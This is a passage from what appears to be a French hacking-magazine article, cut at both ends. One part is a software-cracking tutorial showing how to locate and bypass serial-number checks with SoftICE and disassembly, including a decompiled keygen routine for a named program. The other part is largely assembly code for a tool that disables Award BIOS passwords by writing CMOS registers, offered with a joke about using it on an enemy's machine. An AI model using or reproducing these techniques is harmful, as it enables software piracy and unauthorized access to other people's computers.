avec plaisir le bel &eacute;cran &quot;Code accept&eacute;&quot;. Pour autant 
vous n'aurez pas trouv&eacute; la solution, mais seulement comment ne pas arriver 
dans la routine &quot;Code Invalide&quot;.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR>III.LES 
BOITES D'ENREGISTREMENT<BR>--------------------------------<BR>La saisie du s&eacute;rial 
se fait majoritairement par le biais d'une boite d'enregistrement comportant autant 
de champs que de donn&eacute;es &agrave; entrer (Nom, Compagnie, Num&eacute;ro 
de s&eacute;rie...). Bien souvent, un message &quot;Code invalide&quot; sanctionnera 
l'entr&eacute;e d'un s&eacute;rial erron&eacute;. L'acc&egrave;s &agrave; cette 
boite l'enregistrement pourra &ecirc;tre propos&eacute;e de fa&ccedil;on syst&eacute;matique, 
et appara&icirc;tra &agrave; chaque lancement de l'application, &ecirc;tre accessible 
par l'un des menus de la barre des t&acirc;ches du programme, soit directement, 
soit via le menu &quot;A propos&quot;, ou par une combinaison de touche. L'acc&egrave;s 
&agrave; cette boite pourra d&eacute;pendre de l'&eacute;tat d'un drapeau Utilisateur 
Licenci&eacute; ou non.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Les 
boites d'enregistrement les plus usuelles peuvent &ecirc;tre class&eacute;es en 
quatre cat&eacute;gories:<BR>- les boites &agrave; champ unique<BR>- les boites 
&agrave; champs multiples<BR>- les boites sans bouton de validation<BR>- les boites 
sans &eacute;cran de validation</FONT></P><P> <FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR>IV. 
ARCHITECTURE<BR>----------------<BR>La saisie du ou des champs<BR>Une fois les 
informations demand&eacute;es entr&eacute;es dans les champs de la boite d'enregistrement, 
le programme va s'occuper d'en saisir le contenu. Pour cela, il va utiliser des 
API Windows comme</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Hmemcpy<BR>GetWindowText 
(A)<BR>GetDlgItemText (A)</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Reference 
To: USER32.GetDlgItemTextA, Ord:00EDh |</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">:0040980B 
FF15DCAA4400 Call dword ptr [0044AADC] -&gt; saisie d'un champ<BR>:00409811 83F80E 
cmp eax, 0000000E -&gt; 14 caract&egrave;res<BR>:00409814 8BF8 mov edi, eax -&gt; 
pousse le nombre de caract&egrave;res entr&eacute;s dans edi<BR>:00409816 0F8C35010000 
jl 00409951 -&gt; jum vers &quot; code invalide &quot;<BR>&quot;* Possible StringData 
Ref from Data Obj -&gt;&quot;0123456789ABCDEF-&quot; |<BR>:0040981C 6854624400 
push 00446254 -&gt; push le bon s&eacute;rial<BR>:00409821 53 push ebx -&gt; push 
notre code<BR>:00409822 E8BD020100 call 00419AE4 -&gt; compare des deux<BR>:00409827 
83C408 add esp, 00000008 -&gt; d&eacute;pile<BR>:0040982A 3BC7 cmp eax, edi -&gt; 
v&eacute;rifcationn du code<BR>:0040982C 0F851F010000 jne 00409951 -&gt; s'il 
est mauvais... &quot; code invalide &quot;</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Dans 
cet exemple, la saisie se fait par GetDlgItemTextA, et &agrave; la sortie de cette 
API, le programme contr&ocirc;le que le code comprend bien 14 caract&egrave;res 
(0E en hexa), et sinon file en proc&eacute;dure code_invalide. Ensuite, les push 
ebx et 00446254, qui poussent notre code sur la pile, vont &ecirc;tre compar&eacute; 
dans le call suivant...<BR> Dans un listing d&eacute;sassembl&eacute;, une recherche 
sur la cha&icirc;ne GetWindowTexta (par exemple), ou en consultant la liste des 
fonctions import&eacute;es, peut permettre de localiser la routine de saisie du 
s&eacute;rial, tout en sachant que cette API peut &eacute;galement &ecirc;tre 
utilis&eacute; par d'autre boite de dialogue.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Le 
code que vous avez entr&eacute; va &ecirc;tre saisi par le programme. Pour cela 
il fait presque toujours appel &agrave; Hmemcpy, l'une des API Windows, qui elle 
m&ecirc;me peut-&ecirc;tre appel&eacute;e par GetdlgItemText(A), ou GetWindowText(A). 
Des breakpoints (&agrave; l'aide du logiciel Soft-Ice) pos&eacute;s sur ces deux 
derni&egrave;res fonctions Windows donnent souvent de bons r&eacute;sultats, mais 
Hmemcpy &agrave; l'avantage. Quand vous tapez un Bpx hmemcpy, vous vous &quot;enfoncez&quot; 
loin dans les proc&eacute;dures Windows, et il n'est pas rare d'avoir &agrave; 
taper une douzaine de fois sur F12 pour finir par quitter le dernier Kernel, le 
dernier User, et enfin revenir au programme sur lequel votre int&eacute;r&ecirc;t 
s'est port&eacute;.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Une 
fois saisi, votre code va &ecirc;tre mis dans un registre, et plus souvent dans 
une adresse m&eacute;moire du genre [00407632], ou [ebp-14]... Il faut toujours 
&ecirc;tre curieux de ce qui peut se trouver dans ces adresses, et ne pas h&eacute;siter 
&agrave; taper un &quot;d ebp-14&quot;, pour en interroger le contenu qui s'affichera 
dans la fen&ecirc;tre des Datas de Soft-Ice.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
Il y a ensuite les API de traitement des Strings:<BR>lstrcmpiA<BR>GetFileAttributesA<BR>lstrcpyA<BR>DeleteFileA<BR>lstrcmpA<BR>(Suivant 
la structure de l'application (16 ou 32 bits), il faudra, ou non, inscrire le 
&quot;A&quot; &agrave; la fin). Sans chercher &agrave; d&eacute;tailler ce que 
font chacune de ces API, voici un exemple pour la fonction lstrcpyA. Elle compare 
deux cha&icirc;nes de caract&egrave;res (&quot;Case Sensitive&quot;), et retourne 
une valeur.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">int 
lstrcmp<BR>LPCTSTR lpString1 // adresse de la premi&egrave;re string<BR>LPCTSTR 
lpString2 // adresse de la seconde string<BR>Param&egrave;tres<BR>lpString1 -&gt; 
Pointe sur la premi&egrave;re cha&icirc;ne non nulle &agrave; comparer.<BR>lpString2 
-&gt; Points sur la seconde cha&icirc;ne non nulle &agrave; comparer.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Cela 
se traduira par une routine de ce genre ci:<BR>0157:004011DD 50 PUSH EAX &lt;- 
pousse votre code sur la pile<BR>0157:004011DE 6830604000 PUSH 406030 &lt;- pousse 
le bon code sur la pile<BR>0157:004011E3 FF1520924000 CALL [KERNEL32!lstrcmp] 
&lt;- les compare<BR>0157:004011E9 85C0 TEST EAX, EAX &lt;- v&eacute;rifie si 
ils sont identiques<BR>0157:004011EB 0F8580000000 JNZ 00401271 &lt;- va en code 
invalide</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">je 
vous laisse imaginer l'int&eacute;r&ecirc;t qu'il y a &agrave; faire un &quot;d 
eax&quot; et un &quot;d 406030&quot; avant le call lstrcmp...</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">**La 
v&eacute;rification du format**<BR>Suivant la forme des caract&egrave;res attendus 
dans les champs de la boite d'enregistrement, le programme va v&eacute;rifier 
la validit&eacute; des cha&icirc;nes saisies. Ainsi, il pourra contr&ocirc;ler 
la pr&eacute;sence, ou non, d'informations dans ces champs, et leurs formats. 
Comme il est rare que votre &quot;vrai&quot; nom contienne des ! ou des chiffres, 
la routine de contr&ocirc;le se branchera sur la proc&eacute;dure ad&eacute;quat, 
et pourra g&eacute;n&eacute;rer un message d'erreur. Il en sera de m&ecirc;me 
si le num&eacute;ro de s&eacute;rie attendu est essentiellement de type alphab&eacute;tique 
alors que vous avez inscrit un s&eacute;rial num&eacute;rique. Il peut &eacute;galement 
&ecirc;tre attendu un ou plusieurs s&eacute;parateurs (-), et finalement la longueur 
de votre nom, ou du num&eacute;ro de s&eacute;rie peut &ecirc;tre contr&ocirc;l&eacute;.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">:0040788D<BR>:0040788F 
<BR>:00407891 <BR>:00407893 <BR>:00407895 <BR>:00407897 <BR>:00407899 <BR>:0040789B 
<BR>:0040789C <BR>:0040789D <BR>:0040789E <BR>:004078A0 8A02<BR>3C61<BR>7206 <BR>3C7A 
<BR>7702 <BR>2C20<BR>8806<BR>42<BR>46 <BR>4B<BR>85DB<BR>75EB mov al, byte ptr 
[edx]<BR>cmp al, 61<BR>jb 00407899<BR>cmp al, 7A<BR>ja00407899<BR>sub al,20<BR>mov 
byte ptr [esi], al<BR>inc edx <BR>inc esi<BR>dec ebx<BR>test ebx, ebx<BR>EXPLICATIONS:<BR>jne 
0040788D Prend une lettre dans [edx], et met l&agrave; dans al. On compare al 
avec 61h (soit le &quot;a&quot; minuscule ASCII). On jump vers la proc&eacute;dure 
00407899 si al est inf&eacute;rieur &agrave; 61h ou vers la proc&eacute;dure 00407899 
si sup&eacute;rieur. On enl&egrave;ve les espaces si on en trouve ( 20h = &quot; 
&quot;). O place al dans [esi] afin de reconstruire une cha&icirc;ne ailleurs<BR>edx=edx+1 
(incr&eacute;mente edx pour la lettre suivante)<BR>esi=esi+1 (incr&eacute;mente 
pour la deuxi&egrave;me cha&icirc;ne) <BR>ebx=ebx-1 (ebx = nombre de caract&egrave;res 
du code )<BR>ebx est-il &eacute;gale &agrave; z&eacute;ro (plus de lettres &agrave; 
lire ?) <BR>On recommence si &ccedil;a n'est pas le cas, ou on continue.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Vous 
aurez remarqu&eacute; que votre code est r&eacute;&eacute;crit ailleurs, et qu'il 
est probable que ce soit sur cette nouvelle adresse que les contr&ocirc;les suivants 
s'effectueront. </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">**La 
g&eacute;n&eacute;ration du code**<BR>L'ing&eacute;niosit&eacute; des auteurs 
dans la g&eacute;n&eacute;ration des codes peut &ecirc;tre des plus navrantes 
jusqu'au plus parano&iuml;aque. Dans l'exemple suivant, et gr&acirc;ce &agrave; 
VBDis, un d&eacute;compilateur Visual basic, vous aurez l'int&eacute;gralit&eacute; 
du source saisissant, g&eacute;n&eacute;rant (en gras) et v&eacute;rifiant votre 
s&eacute;rial</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">If 
Texte1.Text = &quot;&quot; Or Texte2.Text = &quot;&quot; Then<BR>MsgBox (&quot;Renseignez 
les deux cadres S.V.P.&quot;), 24, &quot;ENREGISTREMENT&quot;<BR>Exit Sub<BR>End 
If<BR>Texte1.Text = UCase$(Texte1.Text)<BR>ReDim l0028(40)<BR>l002E = 0: l0028(l0032) 
= 0<BR>For l0032 = 1 To Len(Texte2.Text)<BR>l0028(l0032) = Int((Asc(Mid$(Texte2, 
l0032, 1))) * l0032 * Len(Texte2.Text) + 46397&amp; / Len(Texte2.Text) + 6) * 
152<BR>l002E = l002E + l0028(l0032)<BR>Next l0032<BR>Etiquette2.Caption = l002E 
+ Left$(Texte2.Text, 2)<BR>If UCase$(Texte1.Text) &lt;&gt; UCase$(Etiquette2.Caption) 
Or Texte1.Text = &quot;&quot; Then<BR>MsgBox (&quot;ERREUR DE CODE&quot;), 64, 
(&quot;ENREGISTREMENT&quot;)<BR>Texte1.Text = &quot;&quot;<BR>Texte2.Text = &quot;&quot;<BR>Open 
&quot;cdgratis.ini&quot; For Output As #2<BR>Print #2, &quot;LICENCE NON ENREGISTREE&quot;<BR>Print 
#2, &quot;76614840LI&quot;<BR>Close #2<BR>Unload Me<BR>Else<BR>l0026 = &quot;LE 
CODE EST CORRECT. &quot;<BR>l0026 = l0026 + Chr$(10)<BR>l0026 = l0026 &amp; UCase$(Texte2.Text)<BR>l0026 
= l0026 + Chr$(10)<BR>l0026 = l0026 &amp; &quot; S'EST ENREGISTRE CONVENABLEMENT.&quot;<BR>Open 
&quot;cdgratis.ini&quot; For Output As #2<BR>Print #2, Texte2.Text<BR>Print #2, 
Texte1.Text<BR>Close #2<BR>MsgBox l0026, 48, &quot;BIENVENUE A CD GRATIS!!!&quot;<BR>l003C 
= &quot;RELANCEZ CD GRATIS POUR METTRE A JOUR&quot;<BR>l003C = l003C + Chr$(10)<BR>l003C 
= l003C &amp; &quot;VOTRE ENREGISTREMENT&quot;<BR>MsgBox l003C, 64, &quot;VERSION 
ENREGISTREE&quot;<BR>End<BR>End If</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Dans 
un autre exemple, voici la partie basse de la routine de g&eacute;n&eacute;ration 
du s&eacute;rial:</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">:0040281B 
B81F85EB51 mov eax, 51EB851F &gt; pousse 51EB851F dans EAX<BR>:00402820 F7E7 mul 
edi &gt; ???????????????<BR>:00402822 8BF2 mov esi, edx &gt; EDX sauv&eacute; 
dans ESI<BR>:00402824 8B542414 mov edx, dword ptr [esp+14]<BR>:00402828 C1EE05 
shr esi, 05 &gt; d&eacute;calage &agrave; droite de 5<BR>:0040282B 8BFE mov edi, 
esi &gt; ESI sauv&eacute; dans EDI<BR>:0040282D 52 push edx &gt; pousse notre 
code sur la pile<BR>:0040282E 81F721332153 xor edi, 53213321 &gt; ou logique entre 
code(h) et 53213321<BR>:00402834 E817390100 call 00416150<BR>:00402839 8B8D94000000 
mov ecx, dword ptr [ebp+94]&gt; place un code dans ECX<BR>:0040283F 83C404 add 
esp, 00000004 &gt; r&eacute;tablie la pile<BR>:00402842 3BC1 cmp eax, ecx &gt; 
compare notre code(h) avec ECX<BR>:00402844 7411 je 00402857 &gt; saute vers code 
valide<BR>:00402846 8B442414 mov eax, dword ptr [esp+14] &gt; notre code en d&eacute;cimal<BR>:0040284A 
50 push eax &gt; pousse notre code sur la pile<BR>:0040284B E800390100 call 00416150 
&gt; conversion en hexa<BR>:00402850 83C404 add esp, 00000004 &gt; r&eacute;tablie 
l'&eacute;tat de la pile<BR>:00402853 3BC6 cmp eax, esi &gt; compare les 2 s&eacute;rials<BR>:00402855 
757B jne 004028D2 &gt; saute vers code invalide<BR>:00402857 E8508F0300 call 0043B7AC 
&gt; d&eacute;but de la proc code valide </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">V.ALORS?<BR>--------<BR>Alors, 
j'esp&egrave;re que cet article vous a permis d'y voir claire sur les keygens. 
ON est parti d'un programme assez commercial et on a finit par lui tirer le num&eacute;ro 
de s&eacute;rie du nez! Comme quoi, la protection, m&ecirc;me dans les logiciels, 
c'est du bluff! Avec les outils n&eacute;cessaire, de bonnes connaissance et un 
bon cerveau (une conscience peut aussi &ecirc;tre utile;) on peut arriver &agrave; 
tout!</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR> 
</FONT></P><P></P><P></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR> 
Beaucoup de programmes permettent de prot&eacute;ger son ordinateur par impl&eacute;mentation 
de mots de passe. Certains, comme Access Denied, vont jusqu'&agrave; se charger 
avant Windows, afin d'assurer une s&eacute;curit&eacute; optimale. Mais, depuis 
le temps des dinosaures, les mots de passes les plus usit&eacute;s en ce qui concerne 
la s&eacute;curit&eacute; d'un PC et qui sont actifs d&egrave;s le d&eacute;marrage 
du PC, sont les mots de passes BIOS. D&egrave;s que ce dernier est activ&eacute;, 
il bloque la machine, avant, tout d&eacute;marrage d'un quelconque OS (DOS, Windows&#133;). 
D&egrave;s lors, la question cruciale est : peut-on craquer un mot de passe BIOS?<BR>Evidemment, 
sinon cet article n'aurait aucune utilit&eacute;. Mais comment ? Certains, d'entre 
vous, en connaisseurs, s'&eacute;criront qu'il suffit simplement de retirer la 
pile CMOS et attendre suffisamment longtemps afin de vider les condensateurs, 
ce qui aurait pour effet de faire gicler le mot de passe. Un petit court-circuit 
du CMOS permet m&ecirc;me d'acc&eacute;l&eacute;rer le processus.<BR>Certes. Admettons 
maintenant que vous &ecirc;tes dans l'incapacit&eacute; d'ouvrir la machine en 
question (qui a dit celle de mon pire ennemi ???;). Il existe &eacute;videmment 
des m&eacute;thodes plus software. Quelques connaissance en ASM seront pr&eacute;f&eacute;rable 
pour mieux comprendre la suite. Mais, avec mon article HS CRAKING (paru pr&eacute;c&eacute;demment), 
vous &ecirc;tes au top ! Le but est de formuler une routine pour r&eacute;cup&eacute;rer 
le password BIOS. Vous comprendrez ainsi la programmation syst&egrave;me en assembleur 
et serait plus &agrave; m&ecirc;me d'optimiser ce fichier, bref de vous d&eacute;brouiller. 
<BR> Cette routine faite maison est destin&eacute; aux possesseurs d'Award Modular 
Bios (les plus courants). Elle est agr&eacute;menter de quelque explications sur 
les points importants de la routine. Let's go.<BR>------------------<BR>;***CRACKING 
AWARD MODULAR BIOS - For Hacker New Magazine***<BR> .MODEL TINY<BR> .CODE<BR>	
ORG 100h</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">;*** 
Program start: ***<BR>start:</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
jmp real_start // jump au d&eacute;but r&eacute;el du prog</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">;*** 
global data: ***<BR> db &quot; ///CRACK POUR AWARD BIOS-StiG///&quot;, 13, 10</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">pw_1 
db 13, 10, &quot;* Password n&eacute;cessaire pour entrer dans le Syst&egrave;me&quot;, 
13, 10, &quot;$&quot;<BR>pw_2 db 13, 10, &quot;* Password n&eacute;cessaire pour 
entrer dans le Setup&quot;, 13, 10, &quot;$&quot;<BR>pw_3 db 13, 10, &quot;* Supervisor-password 
DESACTIVE&quot;, 13, 10, &quot;$&quot;<BR>pw_4 db 13, 10, &quot;* Supervisor-password 
ACTIVE&quot;, 13, 10, &quot;$&quot;<BR>pw_5 db 13, 10, &quot;* User-password DESACTIVE&quot;, 
13, 10, &quot;$&quot;<BR>pw_6 db 13, 10, &quot;* User-password is ACTIVE&quot;, 
13, 10, &quot;$&quot;</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">;format: 
length, &quot;cmdl&quot;:<BR>;-------------------------------<BR>p_show db 4, 
&quot;SHOW&quot; //commandes de param&egrave;tres<BR>p_soff db 8, &quot;SUPEROFF&quot;<BR>p_son 
db 7, &quot;SUPERON&quot;<BR>p_system db 6, &quot;SYSTEM&quot;<BR>p_setup db 5, 
&quot;SETUP&quot;<BR>p_uoff db 7, &quot;USEROFF&quot;<BR>p_uon db 6, &quot;USERON&quot;</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">num_params 
EQU 7</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">help 
db 13, 10, &quot;Usage: AW-CRACK [SHOW | SUPERON|SUPEROFF | USERON|USEROFF | SYSTEM|SETUP]&quot;<BR> 
db 13, 10<BR> db 13, 10<BR> db 13, 10, &quot; SUPERON|SUPEROFF,&quot;<BR> db 13, 
10, &quot; USERON|USEROFF: ... // active ou d&eacute;sactive le password du BIOS!&quot;<BR> 
db 13, 10, &quot; WARNING!: ne jamais l'activ&eacute; avec un password inconnu!,&quot;<BR> 
db 13, 10<BR> db 13, 10, &quot;Ce programme fonctionne UNIQUEMENT avec les Award 
Modular BIOS&quot;</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">cmdl 
db 128 dup (?)<BR> db &quot;$&quot;</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">;*** 
print_msg: ***<BR>print_msg:<BR> mov ah, 09h<BR> int 21h<BR> ret</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">;*** 
parse_cmdl: ***<BR>;<BR>;return: AX: 0000h = SHOW<BR>; 0001h = ON, 0002h = OFF<BR>; 
0003h = SYSTEM, 0004h = SETUP<BR>; FFFFh = erreur... (param&egrave;tre de cmdl 
inconnu)<BR>parse_cmdl:</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">;*** 
Copie le premier command-line : ***<BR> mov si, 80h // PSP: command-line (cmdl)<BR> 
lea di, cmdl<BR> lodsb<BR> xor cx, cx<BR> mov cl, al // CX = length of cmdl<BR> 
lodsb<BR> rep movsb</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">;*** 
upcase command-line: ***<BR> lea di, cmdl<BR> lea si, cmdl<BR> mov cl, al<BR>uploop:<BR>	
lodsb<BR> cmp al, 97 // 'a'<BR> jb upok</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
cmp al, 122 // 'z'<BR> ja upok</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">	
sub al, (97-65<BR>upok:<BR> stosb<BR> loop uploop</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">;*** 
compare les cmdl-parameters: ***</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
lea si, p_show</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
xor ax, ax // retourne la valeur</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
mov cx, num_params // diff&eacute;rents cmdl-params possible<BR>comp_loop:<BR> 
push cx<BR> push ax</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
lea di, cmdl<BR> lodsb<BR> xor cx, cx // r&eacute;cup&egrave;re sa longueur<BR> 
mov cl, al<BR> repe cmpsb<BR> mov bx, cx</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
add si, cx</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
pop ax // r&eacute;cup&egrave;re la valeur<BR> pop cx</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
or bx, bx<BR> jz done</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
inc ax<BR> loop comp_loop</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">error:<BR> 
mov ax, 0ffffh //ERREUR</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">done:<BR>	
ret</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">;&plusmn;&plusmn;&plusmn; 
read_CMOS: &plusmn;&plusmn;&plusmn;<BR>read_CMOS:<BR> mov dx, 70h // lit dans 
le CMOS &agrave; la position de AL<BR> out dx, al<BR> inc dx<BR> in al, dx<BR> 
ret<BR>;&plusmn;&plusmn;&plusmn; write_CMOS: &plusmn;&plusmn;&plusmn;<BR>write_CMOS:<BR>	
mov dx, 70h // &eacute;criture AH dans le CMOS &agrave; la position de AL<BR>	
out dx, al<BR> inc dx<BR> mov al, ah<BR> out dx, al<BR> ret</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">;&plusmn;&plusmn;&plusmn; 
show_info: &plusmn;&plusmn;&plusmn;<BR>show_info:</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">;*** 
Supervisor-password d&eacute;sactiv&eacute;/activ&eacute;? ***</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
mov al, 11h // lit la position 5eh du CMOS<BR> call read_CMOS</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
lea dx, pw_3 // supervisor-password d&eacute;sactiv&eacute;</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">	
and al, 02h<BR> jz pw_superdisabled</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
lea dx, pw_4 // supervisor-password activ&eacute;<BR> call print_msg<BR> jmp pw_level</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">pw_superdisabled:<BR>	
call print_msg</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">;*** 
User-password d&eacute;sactiv&eacute;/activ&eacute;? ***<BR> <BR> mov al, 5eh 
// lit la position 5eh du CMOS<BR> call read_CMOS</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">	
lea dx, pw_5 // user-password d&eacute;sactiv&eacute;</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
and al, 01h<BR> jz pw_userdisabled</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
lea dx, pw_6 // user-password activ&eacute;<BR> call print_msg<BR> jmp pw_level</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">pw_userdisabled:<BR> 
call print_msg<BR> jmp show_done<BR> <BR>pw_level: // &eacute;crit sur le password-level</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
mov al, 11h // lit la position 11h dans le CMOS<BR> call read_CMOS</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
lea dx, pw_1 // niveau du syst&egrave;me</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">	
and al, 01h // password: niveau du Syst&egrave;me/Setup<BR> jnz pw_system</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">	
lea dx, pw_2 // niveau du setup</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">pw_system:<BR> 
call print_msg</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">show_done:</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">	
ret</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">;&plusmn;&plusmn;&plusmn; 
do_checksum: &plusmn;&plusmn;&plusmn;<BR>do_checksum: // calcule des nouveaux 
checksum du CMOS et les &eacute;crit dans le CMOS</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR>	
mov cx, 2dh - 10h + 1 // CMOS-reg. (10h - 2dh) + 1<BR> xor ah, ah<BR> xor bx, 
bx</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">checksum_loop:</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
mov dx, 70h<BR> mov al, 2dh + 1<BR> sub al, cl // al = registre dans le CMOS<BR> 
out dx, al<BR> inc dx<BR> in al, dx // lit le CMOS-reg</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
add bx, ax // ajoute 2 checksum</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
loop checksum_loop</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">	
mov dx, 70h<BR> mov al, 2eh<BR> out dx, al<BR> inc dx<BR> mov al, bh<BR> out dx, 
al</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> mov 
dx, 70h<BR> mov al, 2fh<BR> out dx, al<BR> inc dx<BR> mov al, bl<BR> out dx, al</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
ret<BR> <BR>;&plusmn;&plusmn;&plusmn; do_checksum_ext: &plusmn;&plusmn;&plusmn;<BR>do_checksum_ext: 
// calcule des nouveaux checksum du CMOS et les &eacute;crit dans le CMOS</FONT></P><P></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">	
mov cx, 79h - 42h + 1 // (42h - 79h) + 1<BR> xor ah, ah<BR> xor bx, bx</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">check_loop_ext:</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">	
mov dx, 70h<BR> mov al, 79h + 1<BR> sub al, cl // al = registre dans le CMOS<BR>	
out dx, al<BR> inc dx<BR> in al, dx // lit reg</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
add bx, ax // ajoute 2 checksum</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">	
loop check_loop_ext<BR> <BR> mov dx, 70h<BR> mov al, 7ah<BR> out dx, al<BR> inc 
dx<BR> mov al, bh<BR> out dx, al</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
mov dx, 70h<BR> mov al, 7bh<BR> out dx, al<BR> inc dx<BR> mov al, bl<BR> out dx, 
al</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> ret</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">;&plusmn;&plusmn;&plusmn; 
real_start: &plusmn;&plusmn;&plusmn;<BR>real_start: // d&eacute;but du programme 
(enfin:)</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
push cs // DS = CS<BR> pop ds<BR> push cs // ES = CS<BR> pop es</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">;*** 
